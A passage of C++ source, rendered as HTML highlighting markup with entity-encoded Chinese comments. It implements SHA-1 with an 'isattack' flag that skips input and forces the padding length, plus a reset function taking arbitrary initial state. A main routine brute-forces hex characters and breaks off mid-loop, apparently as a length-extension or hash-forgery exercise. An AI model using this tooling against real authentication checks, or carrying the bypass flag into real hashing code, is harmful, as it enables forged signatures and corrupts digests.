         int   <span class="class">SHA1Input</span>(  <span class="class">SHA1Context</span> *, const   unsigned char *, unsigned int);
         //!   <span class="symbol">#SHA1</span>&amp;<span class="symbol">#x7684</span>;&amp;<span class="symbol">#x7ED3</span>;&amp;<span class="symbol">#x679C</span>;&amp;<span class="symbol">#x63CF</span>;&amp;<span class="symbol">#x8FF0</span>;&amp;<span class="symbol">#x51FD</span>;&amp;<span class="symbol">#x6570</span>;
      /*!
           @see int <span class="class">SHA1Result</span>( <span class="class">SHA1Context</span> *,   unsigned char <span class="class">Message_Digest</span>[<span class="class">SHA1HashSize</span>]);
           @param[<span class="class">SHA1Context</span>*  &amp;<span class="symbol">#x5B9A</span>;&amp;<span class="symbol">#x4E49</span>;&amp;<span class="symbol">#x586B</span>;&amp;<span class="symbol">#x5145</span>;&amp;<span class="symbol">#x4FE1</span>;&amp;<span class="symbol">#x606F</span>;&amp;<span class="symbol">#x6307</span>;&amp;<span class="symbol">#x9488</span>;
      @param[unsigned char <span class="number">160</span>&amp;<span class="symbol">#x6BD4</span>;&amp;<span class="symbol">#x7279</span>;&amp;<span class="symbol">#x7684</span>;&amp;<span class="symbol">#x6D88</span>;&amp;<span class="symbol">#x606F</span>;&amp;<span class="symbol">#x6458</span>;&amp;<span class="symbol">#x8981</span>;&amp;<span class="symbol">#x961F</span>;&amp;<span class="symbol">#x5217</span>;
           @attention &amp;<span class="symbol">#x8FD4</span>;&amp;<span class="symbol">#x56DE</span>;&amp;<span class="symbol">#x4E00</span>;&amp;<span class="symbol">#x4E2A</span>;<span class="number">160</span>&amp;<span class="symbol">#x6BD4</span>;&amp;<span class="symbol">#x7279</span>;&amp;<span class="symbol">#x7684</span>;&amp;<span class="symbol">#x6D88</span>;&amp;<span class="symbol">#x606F</span>;&amp;<span class="symbol">#x6458</span>;&amp;<span class="symbol">#x8981</span>;&amp;<span class="symbol">#x961F</span>;&amp;<span class="symbol">#x5217</span>;
           @return[enum] &amp;<span class="symbol">#x6210</span>;&amp;<span class="symbol">#x529F</span>;&amp;<span class="symbol">#x8FD4</span>;&amp;<span class="symbol">#x56DE</span>;shaNull&amp;<span class="symbol">#xFF0C</span>;&amp;<span class="symbol">#x5931</span>;&amp;<span class="symbol">#x8D25</span>;&amp;<span class="symbol">#x8FD4</span>;&amp;<span class="symbol">#x56DE</span>;shaSuccess&amp;<span class="symbol">#xFF0C</span>;&amp;<span class="symbol">#x9519</span>;&amp;<span class="symbol">#x8BEF</span>;&amp;<span class="symbol">#x8FD4</span>;&amp;<span class="symbol">#x56DE</span>;shaStateError
           @see <span class="class">SHA1</span> enum
      */
         int   <span class="class">SHA1Result</span>( <span class="class">SHA1Context</span> *, unsigned char <span class="class">Message_Digest</span>[<span class="class">SHA1HashSize</span>]);

<span class="method">private:</span>
};

<span class="symbol">#endif</span> // <span class="class">SHA1_H</span>

<span class="class">Sha1</span>.app
// sha1.cpp : <span class="class">Defines</span> the entry   point for the console application.
//

<span class="symbol">#include</span> &amp;quot;<span class="class">SHA1</span>.h&amp;quot;
<span class="symbol">#include</span> &amp;quot;stdio.h&amp;quot;
<span class="symbol">#include</span> &amp;quot;windows.h&amp;quot;
/*&amp;<span class="symbol">#xFF01</span>;&amp;<span class="symbol">#x4EE5</span>;&amp;<span class="symbol">#x4E0B</span>;&amp;<span class="symbol">#x6240</span>;&amp;<span class="symbol">#x7528</span>;&amp;<span class="symbol">#x5404</span>;&amp;<span class="symbol">#x79CD</span>;&amp;<span class="symbol">#x53C2</span>;&amp;<span class="symbol">#x91CF</span>;&amp;<span class="symbol">#x540D</span>;&amp;<span class="symbol">#x79F0</span>;&amp;<span class="symbol">#x7686</span>;&amp;<span class="symbol">#x4E3A</span>;sha-<span class="number">1</span>&amp;<span class="symbol">#x5728</span>;&amp;<span class="symbol">#x51FA</span>;&amp;<span class="symbol">#x7248</span>;&amp;<span class="symbol">#x7269</span>;&amp;<span class="symbol">#x4E0A</span>;&amp;<span class="symbol">#x6240</span>;&amp;<span class="symbol">#x7528</span>;&amp;<span class="symbol">#x4E4B</span>;&amp;<span class="symbol">#x516C</span>;&amp;<span class="symbol">#x7528</span>;&amp;<span class="symbol">#x540D</span>;&amp;<span class="symbol">#x79F0</span>;  */
/*
 *  &amp;<span class="symbol">#x4EE5</span>;&amp;<span class="symbol">#x4E0B</span>;&amp;<span class="symbol">#x662F</span>;&amp;<span class="symbol">#x4E3A</span>; <span class="class">SHA1</span> &amp;<span class="symbol">#x5411</span>;&amp;<span class="symbol">#x5DE6</span>;&amp;<span class="symbol">#x73AF</span>;&amp;<span class="symbol">#x5F62</span>;&amp;<span class="symbol">#x79FB</span>;&amp;<span class="symbol">#x4F4D</span>;&amp;<span class="symbol">#x5B8F</span>; &amp;<span class="symbol">#x4E4B</span>;&amp;<span class="symbol">#x5B9A</span>;&amp;<span class="symbol">#x4E49</span>;
 */

<span class="class">BOOL</span> isattack = <span class="class">FALSE</span>;
int paddinglength = <span class="number">0</span>;

<span class="symbol">#define</span>   <span class="class">SHA1CircularShift</span>(bits,word) \
                (((word) &amp;lt;&amp;lt; (bits)) |   ((word) &amp;gt;&amp;gt; (<span class="number">32</span>-(bits))))

<span class="class">SHA_1</span>::<span class="class">SHA_1</span>()
{
}

<span class="class">SHA_1</span>::~<span class="class">SHA_1</span>(void)
{
}

/*
 *  &amp;<span class="symbol">#x4EE5</span>;&amp;<span class="symbol">#x4E0B</span>;&amp;<span class="symbol">#x4E3A</span>;sha-<span class="number">1</span>&amp;<span class="symbol">#x6D88</span>;&amp;<span class="symbol">#x606F</span>;&amp;<span class="symbol">#x5757</span>;&amp;<span class="symbol">#x63CF</span>;&amp;<span class="symbol">#x8FF0</span>;&amp;<span class="symbol">#xFF1A</span>;
 *  &amp;<span class="symbol">#x6D88</span>;&amp;<span class="symbol">#x606F</span>;&amp;<span class="symbol">#x5757</span>;&amp;<span class="symbol">#x957F</span>;&amp;<span class="symbol">#x5EA6</span>;&amp;<span class="symbol">#x4E3A</span>;&amp;<span class="symbol">#x56FA</span>;&amp;<span class="symbol">#x5B9A</span>;&amp;<span class="symbol">#x4E4B</span>;<span class="number">512</span>&amp;<span class="symbol">#x6BD4</span>;&amp;<span class="symbol">#x7279</span>;
 */
void   <span class="class">SHA_1</span>::<span class="class">SHA1ProcessMessageBlock</span>(<span class="class">SHA1Context</span> *context)
{
      const unsigned long <span class="class">K</span>[] =      {       /* <span class="class">Constants</span> defined in   <span class="class">SHA</span>-<span class="number">1</span>   */
                            <span class="number">0x5A827999</span>,
                            <span class="number">0x6ED9EBA1</span>,
                            <span class="number">0x8F1BBCDC</span>,
                            <span class="number">0xCA62C1D6</span>
                            };
      int               t;                 /* &amp;<span class="symbol">#x5FAA</span>;&amp;<span class="symbol">#x73AF</span>;&amp;<span class="symbol">#x8BA1</span>;&amp;<span class="symbol">#x6570</span>; */
      unsigned long      temp;              /* &amp;<span class="symbol">#x4E34</span>;&amp;<span class="symbol">#x65F6</span>;&amp;<span class="symbol">#x7F13</span>;&amp;<span class="symbol">#x5B58</span>; */
      unsigned long      <span class="class">W</span>[<span class="number">80</span>];             /* &amp;<span class="symbol">#x5B57</span>;&amp;<span class="symbol">#x987A</span>;&amp;<span class="symbol">#x5E8F</span>;   */
      unsigned long      <span class="class">A</span>, <span class="class">B</span>, <span class="class">C</span>, <span class="class">D</span>,   <span class="class">E</span>;     /* &amp;<span class="symbol">#x8BBE</span>;&amp;<span class="symbol">#x7F6E</span>;&amp;<span class="symbol">#x7CFB</span>;&amp;<span class="symbol">#x7EDF</span>;&amp;<span class="symbol">#x78C1</span>;&amp;<span class="symbol">#x76D8</span>;&amp;<span class="symbol">#x7F13</span>;&amp;<span class="symbol">#x5B58</span>;&amp;<span class="symbol">#x5757</span>; */

      /*
     *    &amp;<span class="symbol">#x4EE5</span>;&amp;<span class="symbol">#x4E0B</span>;&amp;<span class="symbol">#x4E3A</span>;&amp;<span class="symbol">#x521D</span>;&amp;<span class="symbol">#x59CB</span>;&amp;<span class="symbol">#x5316</span>;&amp;<span class="symbol">#x5728</span>;<span class="class">W</span>&amp;<span class="symbol">#x961F</span>;&amp;<span class="symbol">#x5217</span>;&amp;<span class="symbol">#x4E2D</span>;&amp;<span class="symbol">#x7684</span>;&amp;<span class="symbol">#x5934</span>;<span class="number">16</span>&amp;<span class="symbol">#x5B57</span>;&amp;<span class="symbol">#x6570</span>;&amp;<span class="symbol">#x636E</span>;
     */
      for(t = <span class="number">0</span>; t &amp;lt; <span class="number">16</span>; t++)
      {
        <span class="class">W</span>[t] = context-&amp;gt;<span class="class">Message_Block</span>[t *   <span class="number">4</span>] &amp;lt;&amp;lt; <span class="number">24</span>;
        <span class="class">W</span>[t] |= context-&amp;gt;<span class="class">Message_Block</span>[t *   <span class="number">4</span> + <span class="number">1</span>] &amp;lt;&amp;lt; <span class="number">16</span>;
        <span class="class">W</span>[t] |= context-&amp;gt;<span class="class">Message_Block</span>[t *   <span class="number">4</span> + <span class="number">2</span>] &amp;lt;&amp;lt; <span class="number">8</span>;
        <span class="class">W</span>[t] |= context-&amp;gt;<span class="class">Message_Block</span>[t *   <span class="number">4</span> + <span class="number">3</span>];
      }

      for(t = <span class="number">16</span>; t &amp;lt; <span class="number">80</span>; t++)
      {
       <span class="class">W</span>[t] = <span class="class">SHA1CircularShift</span>(<span class="number">1</span>,<span class="class">W</span>[t-<span class="number">3</span>] ^   <span class="class">W</span>[t-<span class="number">8</span>] ^ <span class="class">W</span>[t-<span class="number">14</span>] ^ <span class="class">W</span>[t-<span class="number">16</span>]);
      }

      <span class="class">A</span> = context-&amp;gt;<span class="class">Intermediate_Hash</span>[<span class="number">0</span>];
      <span class="class">B</span> = context-&amp;gt;<span class="class">Intermediate_Hash</span>[<span class="number">1</span>];
      <span class="class">C</span> = context-&amp;gt;<span class="class">Intermediate_Hash</span>[<span class="number">2</span>];
      <span class="class">D</span> = context-&amp;gt;<span class="class">Intermediate_Hash</span>[<span class="number">3</span>];
      <span class="class">E</span> = context-&amp;gt;<span class="class">Intermediate_Hash</span>[<span class="number">4</span>];
      /* 
     *    &amp;<span class="symbol">#x4EE5</span>;&amp;<span class="symbol">#x4E0B</span>;&amp;<span class="symbol">#x4E3A</span>;&amp;<span class="symbol">#x5B9A</span>;&amp;<span class="symbol">#x4E49</span>;&amp;<span class="symbol">#x7B97</span>;&amp;<span class="symbol">#x6CD5</span>;&amp;<span class="symbol">#x6240</span>;&amp;<span class="symbol">#x7528</span>;&amp;<span class="symbol">#x4E4B</span>;&amp;<span class="symbol">#x6570</span>;&amp;<span class="symbol">#x5B66</span>;&amp;<span class="symbol">#x51FD</span>;&amp;<span class="symbol">#x6570</span>;&amp;<span class="symbol">#x53CA</span>;&amp;<span class="symbol">#x5176</span>;&amp;<span class="symbol">#x8FED</span>;&amp;<span class="symbol">#x4EE3</span>;&amp;<span class="symbol">#x7B97</span>;&amp;<span class="symbol">#x6CD5</span>;&amp;<span class="symbol">#x63CF</span>;&amp;<span class="symbol">#x8FF0</span>; 
     */
      for(t = <span class="number">0</span>; t &amp;lt; <span class="number">20</span>; t++)
      {
                   temp   =  <span class="class">SHA1CircularShift</span>(<span class="number">5</span>,<span class="class">A</span>) +
                            ((<span class="class">B</span>   &amp;amp; <span class="class">C</span>) | ((~<span class="class">B</span>) &amp;amp; <span class="class">D</span>)) + <span class="class">E</span> + <span class="class">W</span>[t] + <span class="class">K</span>[<span class="number">0</span>];
                   <span class="class">E</span>   = <span class="class">D</span>;
                   <span class="class">D</span>   = <span class="class">C</span>;
                   <span class="class">C</span>   = <span class="class">SHA1CircularShift</span>(<span class="number">30</span>,<span class="class">B</span>);
                   <span class="class">B</span>   = <span class="class">A</span>;
                   <span class="class">A</span>   = temp;
      }

      for(t = <span class="number">20</span>; t &amp;lt; <span class="number">40</span>; t++)
      {
        temp = <span class="class">SHA1CircularShift</span>(<span class="number">5</span>,<span class="class">A</span>) + (<span class="class">B</span> ^   <span class="class">C</span> ^ <span class="class">D</span>) + <span class="class">E</span> + <span class="class">W</span>[t] + <span class="class">K</span>[<span class="number">1</span>];
        <span class="class">E</span> = <span class="class">D</span>;
        <span class="class">D</span> = <span class="class">C</span>;
        <span class="class">C</span> = <span class="class">SHA1CircularShift</span>(<span class="number">30</span>,<span class="class">B</span>);
        <span class="class">B</span> = <span class="class">A</span>;
        <span class="class">A</span> = temp;
      }

      for(t = <span class="number">40</span>; t &amp;lt; <span class="number">60</span>; t++)
      {
        temp = <span class="class">SHA1CircularShift</span>(<span class="number">5</span>,<span class="class">A</span>) +
               ((<span class="class">B</span> &amp;amp; <span class="class">C</span>) | (<span class="class">B</span> &amp;amp; <span class="class">D</span>) |   (<span class="class">C</span> &amp;amp; <span class="class">D</span>)) + <span class="class">E</span> + <span class="class">W</span>[t] + <span class="class">K</span>[<span class="number">2</span>];
        <span class="class">E</span> = <span class="class">D</span>;
        <span class="class">D</span> = <span class="class">C</span>;
        <span class="class">C</span> = <span class="class">SHA1CircularShift</span>(<span class="number">30</span>,<span class="class">B</span>);
        <span class="class">B</span> = <span class="class">A</span>;
        <span class="class">A</span> = temp;
      }

      for(t = <span class="number">60</span>; t &amp;lt; <span class="number">80</span>; t++)
      {
        temp = <span class="class">SHA1CircularShift</span>(<span class="number">5</span>,<span class="class">A</span>) + (<span class="class">B</span> ^   <span class="class">C</span> ^ <span class="class">D</span>) + <span class="class">E</span> + <span class="class">W</span>[t] + <span class="class">K</span>[<span class="number">3</span>];
        <span class="class">E</span> = <span class="class">D</span>;
        <span class="class">D</span> = <span class="class">C</span>;
        <span class="class">C</span> = <span class="class">SHA1CircularShift</span>(<span class="number">30</span>,<span class="class">B</span>);
        <span class="class">B</span> = <span class="class">A</span>;
        <span class="class">A</span> = temp;
      }
      /* 
     *    &amp;<span class="symbol">#x4EE5</span>;&amp;<span class="symbol">#x4E0B</span>;&amp;<span class="symbol">#x4E3A</span>;&amp;<span class="symbol">#x8FED</span>;&amp;<span class="symbol">#x4EE3</span>;&amp;<span class="symbol">#x7B97</span>;&amp;<span class="symbol">#x6CD5</span>;&amp;<span class="symbol">#x7B2C</span>;<span class="number">80</span>&amp;<span class="symbol">#x6B65</span>;&amp;<span class="symbol">#xFF08</span>;&amp;<span class="symbol">#x6700</span>;&amp;<span class="symbol">#x540E</span>;&amp;<span class="symbol">#x4E00</span>;&amp;<span class="symbol">#x6B65</span>;&amp;<span class="symbol">#xFF09</span>;&amp;<span class="symbol">#x63CF</span>;&amp;<span class="symbol">#x8FF0</span>;
     */
      context-&amp;gt;<span class="class">Intermediate_Hash</span>[<span class="number">0</span>] += <span class="class">A</span>;
      context-&amp;gt;<span class="class">Intermediate_Hash</span>[<span class="number">1</span>] += <span class="class">B</span>;
      context-&amp;gt;<span class="class">Intermediate_Hash</span>[<span class="number">2</span>] += <span class="class">C</span>;
      context-&amp;gt;<span class="class">Intermediate_Hash</span>[<span class="number">3</span>] += <span class="class">D</span>;
      context-&amp;gt;<span class="class">Intermediate_Hash</span>[<span class="number">4</span>] += <span class="class">E</span>;

      context-&amp;gt;<span class="class">Message_Block_Index</span> = <span class="number">0</span>;
}


/*
 *    <span class="class">SHA1PadMessage</span>
 *  &amp;<span class="symbol">#x6570</span>;&amp;<span class="symbol">#x636E</span>;&amp;<span class="symbol">#x586B</span>;&amp;<span class="symbol">#x5145</span>;&amp;<span class="symbol">#x6A21</span>;&amp;<span class="symbol">#x5757</span>;
 */

void   <span class="class">SHA_1</span>::<span class="class">SHA1PadMessage</span>(<span class="class">SHA1Context</span> *context)
{

      if (context-&amp;gt;<span class="class">Message_Block_Index</span> &amp;gt; <span class="number">55</span>)
      {
          context-&amp;gt;<span class="class">Message_Block</span>[context-&amp;gt;<span class="class">Message_Block_Index</span>++] = <span class="number">0x80</span>;
        while(context-&amp;gt;<span class="class">Message_Block_Index</span>   &amp;lt; <span class="number">64</span>)
        {
              context-&amp;gt;<span class="class">Message_Block</span>[context-&amp;gt;<span class="class">Message_Block_Index</span>++] = <span class="number">0</span>;
          }

        <span class="class">SHA1ProcessMessageBlock</span>(context);

        while(context-&amp;gt;<span class="class">Message_Block_Index</span>   &amp;lt; <span class="number">56</span>)
        {
              context-&amp;gt;<span class="class">Message_Block</span>[context-&amp;gt;<span class="class">Message_Block_Index</span>++] = <span class="number">0</span>;
        }
      }
      else
      {
          context-&amp;gt;<span class="class">Message_Block</span>[context-&amp;gt;<span class="class">Message_Block_Index</span>++] = <span class="number">0x80</span>;
        while(context-&amp;gt;<span class="class">Message_Block_Index</span>   &amp;lt; <span class="number">56</span>)
        {
              context-&amp;gt;<span class="class">Message_Block</span>[context-&amp;gt;<span class="class">Message_Block_Index</span>++] = <span class="number">0</span>;
        }
      }

      /*
     *    &amp;<span class="symbol">#x628A</span>;&amp;<span class="symbol">#x6700</span>;&amp;<span class="symbol">#x540E</span>;<span class="number">64</span>&amp;<span class="symbol">#x4F4D</span>;&amp;<span class="symbol">#x4FDD</span>;&amp;<span class="symbol">#x5B58</span>;&amp;<span class="symbol">#x4E3A</span>;&amp;<span class="symbol">#x6570</span>;&amp;<span class="symbol">#x636E</span>;&amp;<span class="symbol">#x957F</span>;&amp;<span class="symbol">#x5EA6</span>;
     */
         if(isattack)
                   context-&amp;gt;<span class="class">Length_Low</span>   = paddinglength*<span class="number">8</span>;

      context-&amp;gt;<span class="class">Message_Block</span>[<span class="number">56</span>] = context-&amp;gt;<span class="class">Length_High</span> &amp;gt;&amp;gt; <span class="number">24</span>;
      context-&amp;gt;<span class="class">Message_Block</span>[<span class="number">57</span>] = context-&amp;gt;<span class="class">Length_High</span> &amp;gt;&amp;gt; <span class="number">16</span>;
      context-&amp;gt;<span class="class">Message_Block</span>[<span class="number">58</span>] = context-&amp;gt;<span class="class">Length_High</span> &amp;gt;&amp;gt; <span class="number">8</span>;
      context-&amp;gt;<span class="class">Message_Block</span>[<span class="number">59</span>] = context-&amp;gt;<span class="class">Length_High</span>;
      context-&amp;gt;<span class="class">Message_Block</span>[<span class="number">60</span>] = context-&amp;gt;<span class="class">Length_Low</span> &amp;gt;&amp;gt; <span class="number">24</span>;
      context-&amp;gt;<span class="class">Message_Block</span>[<span class="number">61</span>] = context-&amp;gt;<span class="class">Length_Low</span> &amp;gt;&amp;gt; <span class="number">16</span>;
      context-&amp;gt;<span class="class">Message_Block</span>[<span class="number">62</span>] = context-&amp;gt;<span class="class">Length_Low</span> &amp;gt;&amp;gt; <span class="number">8</span>;
      context-&amp;gt;<span class="class">Message_Block</span>[<span class="number">63</span>] = context-&amp;gt;<span class="class">Length_Low</span>;

      <span class="class">SHA1ProcessMessageBlock</span>(context);
}

/*
 *    <span class="class">SHA1Reset</span>
 * 
 *  &amp;<span class="symbol">#x4EE5</span>;&amp;<span class="symbol">#x4E0B</span>;&amp;<span class="symbol">#x4E3A</span>;&amp;<span class="symbol">#x6570</span>;&amp;<span class="symbol">#x636E</span>;&amp;<span class="symbol">#x521D</span>;&amp;<span class="symbol">#x59CB</span>;&amp;<span class="symbol">#x5316</span>;&amp;<span class="symbol">#x4E4B</span>;&amp;<span class="symbol">#x64CD</span>;&amp;<span class="symbol">#x4F5C</span>;
 *    <span class="class">Parameters</span>:&amp;<span class="symbol">#xFF08</span>;&amp;<span class="symbol">#x53C2</span>;&amp;<span class="symbol">#x6570</span>;&amp;<span class="symbol">#x8BBE</span>;&amp;<span class="symbol">#x7F6E</span>;&amp;<span class="symbol">#xFF09</span>;
 *    <span class="method">context:</span> [in/out]
 *  <span class="class">The</span>   context to reset.
 *
 */
int <span class="class">SHA_1</span>::<span class="class">SHA1Reset</span>(<span class="class">SHA1Context</span>   *context, unsigned long h1, unsigned long h2, unsigned long h3,unsigned long   h4,unsigned long h5)
{
      if (!context)
      {
        return shaNull;
      }

      context-&amp;gt;<span class="class">Length_Low</span>               = <span class="number">0</span>;
      context-&amp;gt;<span class="class">Length_High</span>              = <span class="number">0</span>;
      context-&amp;gt;<span class="class">Message_Block_Index</span>      = <span class="number">0</span>;

      context-&amp;gt;<span class="class">Intermediate_Hash</span>[<span class="number">0</span>]     = h1;
      context-&amp;gt;<span class="class">Intermediate_Hash</span>[<span class="number">1</span>]     = h2;
      context-&amp;gt;<span class="class">Intermediate_Hash</span>[<span class="number">2</span>]     = h3;
      context-&amp;gt;<span class="class">Intermediate_Hash</span>[<span class="number">3</span>]     = h4;
      context-&amp;gt;<span class="class">Intermediate_Hash</span>[<span class="number">4</span>]     = h5;

      context-&amp;gt;<span class="class">Computed</span>   = <span class="number">0</span>;
      context-&amp;gt;<span class="class">Corrupted</span>  = <span class="number">0</span>;
      return shaSuccess;
}

/*
 *    <span class="class">SHA1Result</span>
 *
 *  &amp;<span class="symbol">#x4EE5</span>;&amp;<span class="symbol">#x4E0B</span>;&amp;<span class="symbol">#x4E3A</span>;sha-<span class="number">1</span>&amp;<span class="symbol">#x7ED3</span>;&amp;<span class="symbol">#x679C</span>;&amp;<span class="symbol">#x63CF</span>;&amp;<span class="symbol">#x8FF0</span>;&amp;<span class="symbol">#xFF1A</span>;
 *:
 *  &amp;<span class="symbol">#x8BE5</span>;&amp;<span class="symbol">#x7B97</span>;&amp;<span class="symbol">#x6CD5</span>;&amp;<span class="symbol">#x5C06</span>;&amp;<span class="symbol">#x4F1A</span>;&amp;<span class="symbol">#x8FD4</span>;&amp;<span class="symbol">#x56DE</span>;&amp;<span class="symbol">#x4E00</span>;&amp;<span class="symbol">#x4E2A</span>;<span class="number">160</span>&amp;<span class="symbol">#x6BD4</span>;&amp;<span class="symbol">#x7279</span>;&amp;<span class="symbol">#x7684</span>;&amp;<span class="symbol">#x6D88</span>;&amp;<span class="symbol">#x606F</span>;&amp;<span class="symbol">#x6458</span>;&amp;<span class="symbol">#x8981</span>;&amp;<span class="symbol">#x961F</span>;&amp;<span class="symbol">#x5217</span>;
 *
 *  &amp;<span class="symbol">#x6216</span>;&amp;<span class="symbol">#x8005</span>;&amp;<span class="symbol">#x8F93</span>;&amp;<span class="symbol">#x51FA</span>;&amp;<span class="symbol">#x8BA1</span>;&amp;<span class="symbol">#x7B97</span>;&amp;<span class="symbol">#x9519</span>;&amp;<span class="symbol">#x8BEF</span>;
 *
 */
int <span class="class">SHA_1</span>::<span class="class">SHA1Result</span>( <span class="class">SHA1Context</span>   *context,
                unsigned char   <span class="class">Message_Digest</span>[<span class="class">SHA1HashSize</span>])
{
      int i;

      if (!context || !<span class="class">Message_Digest</span>)
      {
        return shaNull;
      }

      if (context-&amp;gt;<span class="class">Corrupted</span>)
      {
        return context-&amp;gt;<span class="class">Corrupted</span>;
      }

      if (!context-&amp;gt;<span class="class">Computed</span>)
      {
        <span class="class">SHA1PadMessage</span>(context);
        for(i=<span class="number">0</span>; i&amp;lt;<span class="number">64</span>; ++i)
        {
            /* &amp;<span class="symbol">#x6D88</span>;&amp;<span class="symbol">#x606F</span>;&amp;<span class="symbol">#x6E05</span>;&amp;<span class="symbol">#x96F6</span>; */
            context-&amp;gt;<span class="class">Message_Block</span>[i] = <span class="number">0</span>;
          }
        context-&amp;gt;<span class="class">Length_Low</span> = <span class="number">0</span>;    /* &amp;<span class="symbol">#x957F</span>;&amp;<span class="symbol">#x5EA6</span>;&amp;<span class="symbol">#x6E05</span>;&amp;<span class="symbol">#x96F6</span>; */
        context-&amp;gt;<span class="class">Length_High</span> = <span class="number">0</span>;
        context-&amp;gt;<span class="class">Computed</span> = <span class="number">1</span>;
      }

      for(i = <span class="number">0</span>; i &amp;lt; <span class="class">SHA1HashSize</span>; ++i)
      {
        <span class="class">Message_Digest</span>[i] =   context-&amp;gt;<span class="class">Intermediate_Hash</span>[i&amp;gt;&amp;gt;<span class="number">2</span>]
                            &amp;gt;&amp;gt; <span class="number">8</span> * ( <span class="number">3</span> - ( i &amp;amp; <span class="number">0x03</span> ) );
      }

      return shaSuccess;
}

/*
 *  &amp;<span class="symbol">#x4EE5</span>;&amp;<span class="symbol">#x4E0B</span>;&amp;<span class="symbol">#x4E3A</span>;sha-<span class="number">1</span>&amp;<span class="symbol">#x8F93</span>;&amp;<span class="symbol">#x5165</span>;&amp;<span class="symbol">#x63CF</span>;&amp;<span class="symbol">#x8FF0</span>;&amp;<span class="symbol">#xFF1A</span>;
 *
 *  &amp;<span class="symbol">#x63A5</span>;&amp;<span class="symbol">#x6536</span>;&amp;<span class="symbol">#x5355</span>;&amp;<span class="symbol">#x4F4D</span>;&amp;<span class="symbol">#x957F</span>;&amp;<span class="symbol">#x5EA6</span>;&amp;<span class="symbol">#x4E3A</span>;<span class="number">8</span>&amp;<span class="symbol">#x5B57</span>;&amp;<span class="symbol">#x8282</span>;&amp;<span class="symbol">#x500D</span>;&amp;<span class="symbol">#x6570</span>;&amp;<span class="symbol">#x7684</span>;&amp;<span class="symbol">#x6D88</span>;&amp;<span class="symbol">#x606F</span>;
 *
 */
int <span class="class">SHA_1</span>::<span class="class">SHA1Input</span>(    <span class="class">SHA1Context</span>    *context,
                  const unsigned char  *message_array,
                  unsigned       length)
{
      if(isattack)
                   return   shaSuccess;

         if   (!length)
      {
        return shaSuccess;
      }

      if (!context || !message_array)
      {
        return shaNull;
      }

      if (context-&amp;gt;<span class="class">Computed</span>)
      {
        context-&amp;gt;<span class="class">Corrupted</span> =   shaStateError;
          return shaStateError;
      }

      if (context-&amp;gt;<span class="class">Corrupted</span>)
      {
         return context-&amp;gt;<span class="class">Corrupted</span>;
      }
      while(length-- &amp;amp;&amp;amp; !context-&amp;gt;<span class="class">Corrupted</span>)
      {
      context-&amp;gt;<span class="class">Message_Block</span>[context-&amp;gt;<span class="class">Message_Block_Index</span>++] =
                    (*message_array &amp;amp;   <span class="number">0xFF</span>);

      context-&amp;gt;<span class="class">Length_Low</span> += <span class="number">8</span>;
      if (context-&amp;gt;<span class="class">Length_Low</span> == <span class="number">0</span>)
      {
        context-&amp;gt;<span class="class">Length_High</span>++;
        if (context-&amp;gt;<span class="class">Length_High</span> == <span class="number">0</span>)
        {
            /* <span class="class">Message</span> is too long */
            context-&amp;gt;<span class="class">Corrupted</span> = <span class="number">1</span>;
        }
      }

      if (context-&amp;gt;<span class="class">Message_Block_Index</span> == <span class="number">64</span>)
      {
        <span class="class">SHA1ProcessMessageBlock</span>(context);
      }

      message_array++;
      }

      return shaSuccess;
}

int main(int argc, char* argv[])
{
         class   <span class="class">SHA_1</span> sha1;
         <span class="class">SHA_1</span>::<span class="class">SHA1Context</span>   sh1context;
//      sha1.<span class="class">SHA1Reset</span>(&amp;amp;sh1context,<span class="number">0x67452301</span>,<span class="number">0xEFCDAB89</span>,<span class="number">0x98BADCFE</span>,<span class="number">0x10325476</span>,<span class="number">0xC3D2E1F0</span>);

         paddinglength   = <span class="number">128</span>;
         isattack   = <span class="class">TRUE</span>;

         char   c[]={&amp;apos;<span class="number">0</span>&amp;apos;,&amp;apos;<span class="number">1</span>&amp;apos;,&amp;apos;<span class="number">2</span>&amp;apos;,&amp;apos;<span class="number">3</span>&amp;apos;,&amp;apos;<span class="number">4</span>&amp;apos;,&amp;apos;<span class="number">5</span>&amp;apos;,&amp;apos;<span class="number">6</span>&amp;apos;,&amp;apos;<span class="number">7</span>&amp;apos;,&amp;apos;<span class="number">8</span>&amp;apos;,&amp;apos;<span class="number">9</span>&amp;apos;,&amp;apos;a&amp;apos;,&amp;apos;b&amp;apos;,&amp;apos;c&amp;apos;,&amp;apos;d&amp;apos;,&amp;apos;e&amp;apos;,&amp;apos;f&amp;apos;};
         int   b[<span class="number">7</span>],b1[<span class="number">7</span>];
         int   bc=<span class="number">0</span>,bc1=<span class="number">0</span>;
         for(int   i=<span class="number">0</span>;i&amp;lt;strlen(argv[<span class="number">1</span>]);i++)
         {
                   if(argv[<span class="number">1</span>][i]   == &amp;apos;x&amp;apos;)
                   {
                            b[bc]   = i;
                            bc++;
                   }
         }

         for(i=<span class="number">0</span>;i&amp;lt;strlen(argv[<span class="number">2</span>]);i++)
         {
                   if(argv[<span class="number">2</span>][i]   == &amp;apos;x&amp;apos;)
                   {
                            b1[bc1]   = i;
                            bc1++;
                   }
         }

         int   i1 = atoi(argv[<span class="number">3</span>]);
//      for(int   i1=<span class="number">7</span>;i1&amp;lt;<span class="number">16</span>;i1++)
         {
                   argv[<span class="number">1</span>][b[<span class="number">0</span>]]   = c[i1];
                   for(int   i2=<span class="number">0</span>;i2&amp;lt;<span class="number">16</span>;i2++)
                   {
                            argv[<span class="number">1</span>][b[<span class="number">1</span>]]   = c[i2];
                            for(int   i3=<span class="number">0</span>;i3&amp;lt;<span class="number">16</span>;i3++)
                            {
                                     printf(&amp;quot;%d   %d %d\n&amp;quot;,i1,i2,i3);
                                     argv[<span class="number">1</span>][b[<span class="number">2</span>]]   = c[i3];
                                     for(int   i4=<span class="number">0</span>;i4&amp;lt;<span class="number">16</span>;i4++)
                                     {
                                               argv[<span class="number">1</span>][b[<span class="number">3</span>]]   = c[i4];
                                               for(int   i5=<span class="number">0</span>;i5&amp;lt;<span class="number">16</span>;i5++)
                                               {
                                                        argv[<span class="number">1</span>][b[<span class="number">4</span>]]   = c[i5];
                                                        for(int   i6=<span class="number">0</span>;i6&amp;lt;<span class="number">16</span>;i6++)
                                                        {
                                                                 argv[<span class="number">1</span>][b[<span class="number">5</span>]]   = c[i6];
                                                                 for(int   i7=<span class="number">0</span>;i7&amp;lt;<span class="number">16</span>;i7++)
                                                                 {
                                                                           argv[<span class="number">1</span>][b[<span class="number">6</span>]]   = c[i7];

                                                                           char   sss[<span class="number">100</span>];
                                                                           char   *tostr;
                                                                           memset(sss,<span class="number">0</span>,sizeof(sss));
                                                                           strcpy(sss,&amp;quot;<span class="number">0</span>x&amp;quot;);
